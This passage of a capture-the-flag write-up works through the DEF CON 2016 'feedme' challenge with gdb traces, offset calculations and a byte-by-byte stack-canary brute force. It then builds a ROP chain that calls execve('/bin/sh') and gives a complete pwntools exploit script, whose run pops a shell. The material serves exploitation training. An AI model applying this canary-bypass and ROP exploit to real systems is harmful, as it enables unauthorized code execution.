$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000010
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049072                  mov    DWORD PTR [esp+0x8], 0x10
    0x804907a                  mov    DWORD PTR [esp+0x4], eax
    0x804907e                  lea    eax, [ebp-0x2c]
 →  0x8049081                  mov    DWORD PTR [esp], eax
    0x8049084                  call   0x8048f6e
    0x8049089                  mov    DWORD PTR [esp+0x4], eax
    0x804908d                  mov    DWORD PTR [esp], 0x80be715
    0x8049094                  call   0x804f700
    0x8049099                  movzx  eax, BYTE PTR [ebp-0x2d]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049081 → mov DWORD PTR [esp], eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08049081 in ?? ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049084  →  0xfffee5e8  →  0x00000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000010
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804907a                  mov    DWORD PTR [esp+0x4], eax
    0x804907e                  lea    eax, [ebp-0x2c]
    0x8049081                  mov    DWORD PTR [esp], eax
 →  0x8049084                  call   0x8048f6e
   ↳   0x8048f6e                  push   ebp
       0x8048f6f                  mov    ebp, esp
       0x8048f71                  push   ebx
       0x8048f72                  sub    esp, 0x1c
       0x8048f75                  mov    edx, DWORD PTR [ebp+0xc]
       0x8048f78                  mov    eax, DWORD PTR [ebp+0x10]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x8048f6e (
   [sp + 0x0] = 0xffffcfec → "00000000000000000000000000000000000000000000000000[...]"
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049084 → call 0x8048f6e
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Thread 2.1 "feedme" hit Breakpoint 3, 0x08049084 in ?? ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0x37      
$esp   : 0xffffcfcc  →  0x08049089  →   mov DWORD PTR [esp+0x4], eax
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08048f6e  →   push ebp
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfcc│+0x0000: 0x08049089  →   mov DWORD PTR [esp+0x4], eax     ← $esp
0xffffcfd0│+0x0004: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
0xffffcfd4│+0x0008: 0x00000037 ("7"?)
0xffffcfd8│+0x000c: 0x00000010
0xffffcfdc│+0x0010: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0014: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0018: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x001c: 0x370ea248
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048f69                  add    eax, 0x57
    0x8048f6c                  leave  
    0x8048f6d                  ret    
 →  0x8048f6e                  push   ebp
    0x8048f6f                  mov    ebp, esp
    0x8048f71                  push   ebx
    0x8048f72                  sub    esp, 0x1c
    0x8048f75                  mov    edx, DWORD PTR [ebp+0xc]
    0x8048f78                  mov    eax, DWORD PTR [ebp+0x10]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048f6e → push ebp
[#1] 0x8049089 → mov DWORD PTR [esp+0x4], eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08048f6e in ?? ()
gef➤  finish
Run till exit from #0  0x08048f6e in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x080ebf40  →  "30303030303030303030303030303030..."
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$edx   : 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$esp   : 0xffffcfd0  →  0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"
$ebp   : 0xffffd018  →  0x30303030 ("0000"?)
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049089  →   mov DWORD PTR [esp+0x4], eax
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  "00000000000000000000000000000000000000000000000000[...]"     ← $esp
0xffffcfd4│+0x0004: 0x00000037 ("7"?)
0xffffcfd8│+0x0008: 0x00000010
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x370ea248
0xffffcfec│+0x001c: "00000000000000000000000000000000000000000000000000[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804907e                  lea    eax, [ebp-0x2c]
    0x8049081                  mov    DWORD PTR [esp], eax
    0x8049084                  call   0x8048f6e
 →  0x8049089                  mov    DWORD PTR [esp+0x4], eax
    0x804908d                  mov    DWORD PTR [esp], 0x80be715
    0x8049094                  call   0x804f700
    0x8049099                  movzx  eax, BYTE PTR [ebp-0x2d]
    0x804909d                  mov    edx, DWORD PTR [ebp-0xc]
    0x80490a0                  xor    edx, DWORD PTR gs:0x14
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049089 → mov DWORD PTR [esp+0x4], eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x08049089 in ?? ()
gef➤  x/5w $eax
0x80ebf40:    0x30333033    0x30333033    0x30333033    0x30333033
0x80ebf50:    0x30333033
gef➤  x/6w $eax
0x80ebf40:    0x30333033    0x30333033    0x30333033    0x30333033
0x80ebf50:    0x30333033    0x30333033
gef➤  x/50w $eax
0x80ebf40:    0x30333033    0x30333033    0x30333033    0x30333033
0x80ebf50:    0x30333033    0x30333033    0x30333033    0x30333033
0x80ebf60:    0x2e2e2e    0x0    0x0    0x0
0x80ebf70:    0x0    0x0    0x0    0x0
0x80ebf80:    0x0    0x0    0x0    0x0
0x80ebf90:    0x0    0x0    0x0    0x0
0x80ebfa0:    0x0    0x0    0x0    0x0
0x80ebfb0:    0x0    0x0    0x0    0x0
0x80ebfc0:    0x0    0x0    0x0    0x0
0x80ebfd0:    0x0    0x0    0x0    0x0
0x80ebfe0:    0x0    0x0    0x0    0x0
0x80ebff0:    0x0    0x0    0x0    0x0
0x80ec000:    0x0    0x0
gef➤  c
Continuing.
ATE 30303030303030303030303030303030...
*** stack smashing detected ***: /Hackery/pod/modules/bof_static/dcquals16_feedme/feedme terminated
```

So we can see that the last function returned a pointer which was `16` bytes of our input converted to ASCII, which was then printed. Let's see what the offset from our input to the stack canary and the return address:

```
gef➤  set follow-fork-mode child
gef➤  b *0x8049069
Breakpoint 1 at 0x8049069
gef➤  r
Starting program: /Hackery/pod/modules/bof_static/dcquals16_feedme/feedme
[New process 15394]
FEED ME!
0
[Switching to process 15394]
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfec  →  0x00000000
$ebx   : 0x080481a8  →   push ebx
$ecx   : 0xffffcfbb  →  0x00000130
$edx   : 0x1       
$esp   : 0xffffcfd0  →  0xffffcfec  →  0x00000000
$ebp   : 0xffffd018  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049069  →  0xfffe10e8  →  0x00000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfd0│+0x0000: 0xffffcfec  →  0x00000000     ← $esp
0xffffcfd4│+0x0004: 0x00000030 ("0"?)
0xffffcfd8│+0x0008: 0x00000000
0xffffcfdc│+0x000c: 0x0806ccb7  →   sub esp, 0x20
0xffffcfe0│+0x0010: 0x080ea200  →  0xfbad2887
0xffffcfe4│+0x0014: 0x080ea247  →  0x0eb4d40a
0xffffcfe8│+0x0018: 0x300ea248
0xffffcfec│+0x001c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804905f                  mov    DWORD PTR [esp+0x4], eax
    0x8049063                  lea    eax, [ebp-0x2c]
    0x8049066                  mov    DWORD PTR [esp], eax
 →  0x8049069                  call   0x8048e7e
   ↳   0x8048e7e                  push   ebp
       0x8048e7f                  mov    ebp, esp
       0x8048e81                  sub    esp, 0x28
       0x8048e84                  mov    eax, DWORD PTR [ebp+0xc]
       0x8048e87                  mov    DWORD PTR [ebp-0x14], eax
       0x8048e8a                  mov    DWORD PTR [ebp-0x10], 0x0
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x8048e7e (
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049069 → call 0x8048e7e
[#1] 0x80490dc → movzx eax, al
[#2] 0x80491da → mov eax, 0x0
[#3] 0x80493ba → mov DWORD PTR [esp], eax
[#4] 0x8048d2b → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────

Thread 2.1 "feedme" hit Breakpoint 1, 0x08049069 in ?? ()
gef➤  
gef➤  x/4w $esp
0xffffcfd0:    0xffffcfec    0x30    0x0    0x806ccb7
gef➤  x/50w 0xffffcfec
0xffffcfec:    0x0    0x2710    0x0    0x0
0xffffcffc:    0x0    0x80ea0a0    0x0    0x0
0xffffd00c:    0x6e6a7000    0x0    0x80ea00c    0xffffd048
0xffffd01c:    0x80490dc    0x80ea0a0    0x0    0x80ed840
0xffffd02c:    0x804f8b4    0x0    0x0    0x0
0xffffd03c:    0x80481a8    0x80481a8    0x0    0xffffd068
0xffffd04c:    0x80491da    0x80ea0a0    0x0    0x2
0xffffd05c:    0x0    0x0    0x80ea00c    0x8049970
0xffffd06c:    0x80493ba    0x1    0xffffd0f4    0xffffd0fc
0xffffd07c:    0x0    0x0    0x80481a8    0x0
0xffffd08c:    0x80ea00c    0x8049970    0x16400ab0    0xe0c61b5f
0xffffd09c:    0x0    0x0    0x0    0x0
0xffffd0ac:    0x0    0x0
gef➤  i f
Stack level 0, frame at 0xffffd020:
 eip = 0x8049069; saved eip = 0x80490dc
 called by frame at 0xffffd050
 Arglist at 0xffffd018, args:
 Locals at 0xffffd018, Previous frame's sp is 0xffffd020
 Saved registers:
  ebp at 0xffffd018, eip at 0xffffd01c
```

We can see that our input is being scanned in starting at `0xffffcfec`. We can see that the return address is at `0xffffd01c`. We can also see that the stack canary is `0x6e6a7000` at `0xffffd00c` (we can tell this since stack canaries in `x86` are 4 byte random values, with the last value being a null byte). Doing a bit of python math we can find the offsets:

```
$    python
Python 2.7.15+ (default, Nov 27 2018, 23:36:35)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xffffd01c - 0xffffcfec)
'0x30'
>>> hex(0xffffd00c - 0xffffcfec)
'0x20'
```

So we can see that the offset to the stack canary is `0x20` bytes, and that the offset to the return address is `0x30` bytes. Both are well within the reach of our buffer overflow. Lastly let's see where the `feedMeFunc` function is called. We can see the backtrace using gdb:

```
gef➤  r
Starting program: /Hackery/pod/modules/bof_static/dcquals16_feedme/feedme
FEED ME!
^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x3d9c    
$ecx   : 0xffffd030  →  0x00000000
$edx   : 0x0       
$esp   : 0xffffd008  →  0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$ebp   : 0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx
$esi   : 0x0       
$edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
$eip   : 0xf7ffd059  →  <__kernel_vsyscall+9> pop ebp
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd008│+0x0000: 0xffffd048  →  0xffffd068  →  0x08049970  →   push ebx     ← $esp
0xffffd00c│+0x0004: 0x00000000
0xffffd010│+0x0008: 0xffffd030  →  0x00000000
0xffffd014│+0x000c: 0x0806cc02  →   pop ebx
0xffffd018│+0x0010: 0x080481a8  →   push ebx
0xffffd01c│+0x0014: 0x0804910e  →   mov DWORD PTR [ebp-0xc], eax
0xffffd020│+0x0018: 0x00003d9c
0xffffd024│+0x001c: 0xffffd030  →  0x00000000
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7ffd053 <__kernel_vsyscall+3> mov    ebp, esp
   0xf7ffd055 <__kernel_vsyscall+5> sysenter
   0xf7ffd057 <__kernel_vsyscall+7> int    0x80
 → 0xf7ffd059 <__kernel_vsyscall+9> pop    ebp
   0xf7ffd05a <__kernel_vsyscall+10> pop    edx
   0xf7ffd05b <__kernel_vsyscall+11> pop    ecx
   0xf7ffd05c <__kernel_vsyscall+12> ret    
   0xf7ffd05d                  nop    
   0xf7ffd05e                  nop    
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "feedme", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7ffd059 → __kernel_vsyscall()
[#1] 0x806cc02 → pop ebx
[#2] 0x804910e → mov DWORD PTR [ebp-0xc], eax
[#3] 0x80491da → mov eax, 0x0
[#4] 0x80493ba → mov DWORD PTR [esp], eax
[#5] 0x8048d2b → hlt
────────────────────────────────────────────────────────────────────────────────
0xf7ffd059 in __kernel_vsyscall ()
gef➤  bt
#0  0xf7ffd059 in __kernel_vsyscall ()
#1  0x0806cc02 in ?? ()
#2  0x0804910e in ?? ()
#3  0x080491da in ?? ()
#4  0x080493ba in ?? ()
#5  0x08048d2b in ?? ()
```

Going through the backtrace leads us to the following function:

```
void parentLoop(void)

{
  int iVar1;
  uint uVar2;
  int check;
  uint i;
 
  check = 0;
  i = 0;
  while( true ) {
    if (799 < i) {
      return;
    }
    iVar1 = FUN_0806cc70();
    if (iVar1 == 0) break;
    iVar1 = callChild(iVar1,&check,0);
    if (iVar1 == -1) {
      puts("Wait error!");
      FUN_0804ed20(0xffffffff);
    }
    if (check == -1) {
      puts("Child IO error!");
      FUN_0804ed20(0xffffffff);
    }
    puts("Child exit.");
    FUN_0804fa20(0);
    i = i + 1;
  }
  uVar2 = feedMeFunc();
  printf("YUM, got %d bytes!\n",uVar2 & 0xff);
  return;
}
```

So we can see it is calling the function responsible for setting up a child process in a loop that will run for `800` times. That means that we can crash a child process a lot of times (around `800`) before the program exits on us.

## Exploitation

#### Stack Canary

So we have the ability to overwrite the return address. The only thing stopping us other than the NX is the stack canary. However we can brute force it. Thing is, all of the child processes will share the same canary. For the canary it will have 4 bytes, one null byte and three random bytes (so only three bytes that we don't know).

What we can do is overwrite the stack canary one byte at a time. The byte we overwrite it with will essentially be a guess. If the child process dies we know that it was incorrect, and if it doesn't, then we will know that our guess was correct. There are `256` different values that byte be, and since there are three bytes we are guessing that gives us `256*3 = 768` possible guesses to guess every combination if we guess one byte at a time (which can be done by only overwriting one byte at a time). With that we can deal with the stack canary.

#### ROP Chain

After that, we will have the stack canary and nothing will be able to stop us from getting code execution. Then the question comes up of what to execute. NX is turned on, so we can't jump to shellcode we place on the stack. However the elf doesn't have PIE (randomizes the address of code) enabled, so building a ROP chain without an infoleak is possible. For this ROP Chain, I will be making a syscall to /bin/sh, which would grant us a shell.

First we look for ROP gadgets using the tool ROPgadget (since this is a statically linked binary, there will be a lot of gadgets):

```
$    python ROPgadget.py --binary feedme
```

Looking through the list of ROP gadgets, we see a few useful gadgets:

```
0x0807be31 : mov dword ptr [eax], edx ; ret
```

This gadget is extremely useful. What this will allow us to do is move the contents of the edx register into the area of space pointed to by the address of eax, then return. So if we wanted to write to the address 1234, we could load that address into eax, and the value we wanted to write into the edx register, then call this gadget.

```
0x080bb496 : pop eax ; ret
```

This gadget is helpful since it will allow us to pop a value off of the stack into the eax register to use, then return to allow us to continue the ROP Chain.

```
0x0806f34a : pop edx ; ret
```

This gadget is similar to the previous one, except it is with the edx register instead of the eax register.

```
0x0806f371 : pop ecx ; pop ebx ; ret
```

This gadget is so we can control the value of the ecx register. Unfortunately there are no gadgets that will just pop a value into the ecx register then return, so this is the next best thing (using this gadget will save us not having to use another gadget when we pop a value into the ebx register however).

```
0x08049761 : int 0x80
```

This gadget is a syscall, which will allow us to make a syscall to the kernell to get a shell (to get a syscall in x86, you can call int 0x80). Syscall will expect three arguments, the interger 11 in eax for the syscall number, the bss address 0x80eb928 in the ebx register for the address of the command, and the value 0x0 in ecx and edx registers (syscall will look for arguments in those registers, however we don't need them so we should just set them to null). For more info on syscalls check out https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux

Now we are going to have to write the string /bin/sh somewhere in memory, at an address that we know in order to pass it as an argument it the syscall. What we can do for this, is to write it to the bss address `0x80eb928`. Since it is in the bss, it will have a static address, so we don't need an infoleak to write to and call it.

With that, we get the following ROP Chain:

```
# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928)    # bss address
payload += p32(0x0806f34a)    # pop edx
payload    += p32(0x6e69622f)    # /bin string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)    # pop edx
payload    += p32(0x0068732f)    # /sh string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

# Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0xb)            # 11
payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
payload += p32(0x0)            # 0x0
payload += p32(0x80eb928)    # bss address
payload += p32(0x0806f34a)    # pop edx ; ret
payload += p32(0x0)            # 0x0
payload += p32(0x8049761)    # syscall
```

## Exploit

Putting it all together, we get the following exploit:
```
# This is based off of a Raytheon SI Govs talk

# First we import pwntools
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
    # We know that the first byte of the stack canary has to be \x00 since it is null terminated, keep the values we know for the canary in known_canary
    known_canary = "\x00"
    # Ascii representation of the canary
    hex_canary = "00"
    # The current canary which will be incremented
    canary = 0x0
    # The number of bytes we will give as input
    inp_bytes = 0x22
    # Iterate 3 times for the three bytes we need to brute force
    for j in range(0, 3):
        # Iterate up to 0xff times to brute force all posible values for byte
        for i in xrange(0xff):
            log.info("Trying canary: " + hex(canary) + hex_canary)
            
            # Send the current input size
            target.send(p32(inp_bytes)[0])

            # Send this iterations canary
            target.send("0"*0x20 + known_canary + p32(canary)[0])

            # Scan in the output, determine if we have a correct value
            output = target.recvuntil("exit.")
            if "YUM" in output:
                # If we have a correct value, record the canary value, reset the canary value, and move on
                print "next byte is: " + hex(canary)
                known_canary = known_canary + p32(canary)[0]
                inp_bytes = inp_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace("0x", "")
                hex_canary = new_canary + hex_canary
                canary = 0x0
                break
            else:
                # If this isn't the canary value, increment canary by one and move onto next loop
                canary = canary + 0x1

    # Return the canary
    return int(hex_canary, 16)

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info("The canary is: " + hex(canary))


# Now that we have the canary, we can start making our final payload

# This will cover the space up to, and including the canary
payload = "0"*0x20 + p32(canary)

# This will cover the rest of the space between the canary and the return address
payload += "1"*0xc

# Start putting together the ROP Chain

# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928)    # bss address
payload += p32(0x0806f34a)    # pop edx
payload    += p32(0x6e69622f)    # /bin string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)    # pop edx
payload    += p32(0x0068732f)    # /sh string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

# Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0xb)            # 11
payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
payload += p32(0x0)            # 0x0
payload += p32(0x80eb928)    # bss address
payload += p32(0x0806f34a)    # pop edx ; ret
payload += p32(0x0)            # 0x0
payload += p32(0x8049761)    # syscall

# Send the amount of bytes for our payload, and the payload itself
target.send("\x78")
target.send(payload)

# Drop to an interactive shell
target.interactive()
```

When we run the exploit:

```
$    python exploit.py
[+] Starting local process './feedme': pid 16881
[*] Trying canary: 0x000
[*] Trying canary: 0x100
[*] Trying canary: 0x200
[*] Trying canary: 0x300
[*] Trying canary: 0x400
[*] Trying canary: 0x500
[*] Trying canary: 0x600
[*] Trying canary: 0x700
[*] Trying canary: 0x800
[*] Trying canary: 0x900

.    .    .

[*] Trying canary: 0xcfcb2200
[*] Trying canary: 0xd0cb2200
[*] Trying canary: 0xd1cb2200
[*] Trying canary: 0xd2cb2200
[*] Trying canary: 0xd3cb2200
[*] Trying canary: 0xd4cb2200
[*] Trying canary: 0xd5cb2200
next byte is: 0xd5
[*] The canary is: 0xd5cb2200
[*] Switching to interactive mode

FEED ME!
ATE 30303030303030303030303030303030...
$ w
 01:49:06 up  4:22,  1 user,  load average: 1.47, 1.31, 1.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               21:26   ?xdm?  26:56   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
core  exploit.py  feedme  readme.md
```

Just like that, we popped a shell!